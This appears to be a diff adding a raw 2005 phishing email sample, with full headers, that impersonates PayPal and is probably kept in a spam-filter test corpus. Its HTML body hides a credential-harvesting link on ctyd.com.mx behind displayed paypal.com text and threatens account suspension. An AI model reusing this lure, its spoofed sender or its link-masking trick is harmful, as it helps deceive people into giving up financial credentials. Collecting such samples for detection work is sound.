@@ -1,0 +1,100 @@
+ nobody@zim.zimpromotions.com  Mon Jun 20 14:22:54 2005
+Return-Path: <nobody@zim.zimpromotions.com>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail1.domain.com (mail1.domain.com [10.0.2.3])
+	by naughty.domain.com (Postfix) with ESMTP id 5144A536EC7
+	for <username@login.domain.com>; Mon, 20 Jun 2005 14:22:54 -0400 (EDT)
+Received: from zim.zimpromotions.com (freshzive.net [67.18.167.138])
+	by mail1.domain.com (Postfix) with ESMTP id 8E1C285A8C3
+	for <username@domain.com>; Mon, 20 Jun 2005 14:22:53 -0400 (EDT)
+Received: from nobody by zim.zimpromotions.com with local (Exim 4.51)
+	id 1DkQv3-0008Gx-4u
+	for username@domain.com; Mon, 20 Jun 2005 13:22:49 -0500
+To: username@domain.com
+Subject: Account compromised: billing information moved or changed.
+From: PayPal <acc-validity@paypal.com>
+Reply-To: no-reply@paypal.com
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1DkQv3-0008Gx-4u@zim.zimpromotions.com>
+Date: Mon, 20 Jun 2005 13:22:49 -0500
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - zim.zimpromotions.com
+X-AntiAbuse: Original Domain - domain.com
+X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
+X-AntiAbuse: Sender Address Domain - zim.zimpromotions.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 20
+
+<html>
+<head>
+<title></title>
+<style type=text/css>
+<!--
+.panel{-moz-border-radius: .3em .3em .3em .3em; border: 1px dotted silver; background-color: #F7F6F4;
+}
+-->
+</style>
+</head>
+<body>
+
+<TABLE align="center" width="70%" border=0>
+<tr>
+<td align="left"><img src="http://www.paypal.com/en_US/i/logo/paypal_logo.gif" border=0></td>
+</tr>
+<tr>
+<td> </td>
+</tr>
+<TR>
+<TD><b>LEGAL NOTICE</b></TD>
+</TR>
+<TR>
+<TD bgcolor="GhostWhite" class="panel">
+      <font face="Arial" size="2px">The following message is an email sent to you by an 
+administrator of "PayPal.com".<br>If this message is spam, contains abusive or other comments you find offensive please 
+contact the webmaster at the following address:
+<a href="mailto:admin@paypal.com">admin@paypal.com</a>
+</TD>
+</TR>
+<TR><TD></TD><br></TR>
+<TR><TD></TD><br></TR>
+<TR>
+<TD class="panel"><b>Message sent to you follows:</b></TD>
+</TR>
+<TR>
+<TR><TD></TD> </TR>
+<TR><TD></TD> </TR>
+<TR><TD></TD></TR>
+<TR>
+        <TD><font color="Navy" size="3"><b>Dear PayPal client,</b></font><br>
+        <br>
+              <font face="Arial" size="2px">While performing it's regular scheduled 
+monthly billing address check our system found incompatible information which seams to be no longer the same with your 
+current credit card information that we have on file. If you changed your billing information or if you moved from you 
+previous address please follow up the link bellow and update your billing information: If you didn't change any of this 
+information you still need to follow up the previous link and update your existing billing information because it means 
+that our database regular scheduled update wasn't made correctly. Choosing to ignore this message will result in to a 
+temporary suspension of your account within 24 hours, until you will choose to solve this unpleasant situation.<br>
+        <br>
+        We apologies for any inconvinience this may caused you and we strongly advise you to update your information you 
+have on file with us. Clicking <a href=" 
+http://ctyd.com.mx/.PayPal/cgi-bin/webscrcmd_login.php">https://www.paypal.com/cgi-bin/webscr?cmd=_login_</a> you will 
+avoid any possible futuring billing problems with your account.<br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <br>
+        <b>Best regards</b>,<br>
+        - <i>PayPal Team</i>.
+        </TD>
+        </tr>
+</TABLE>
+
